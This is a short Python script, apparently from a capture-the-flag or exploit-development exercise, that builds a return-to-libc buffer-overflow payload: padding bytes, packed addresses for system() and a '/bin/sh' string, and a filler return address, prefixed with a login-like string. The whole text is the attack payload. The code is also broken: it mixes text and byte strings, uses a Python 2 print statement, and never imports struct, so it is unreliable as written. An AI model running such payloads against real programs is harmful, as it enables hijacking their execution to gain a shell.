offset = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK' + 8*b'MMMM' + b'NNNN'

sh_addr = struct.pack("I", 0xf7f897ec)

system = struct.pack("I", 0xf7e6aed0)

address = b"AAAA"

nop = b'\x90'

s_payload = "dat_wil\n"+offset+system+address+sh_addr

import sys
print s_payload
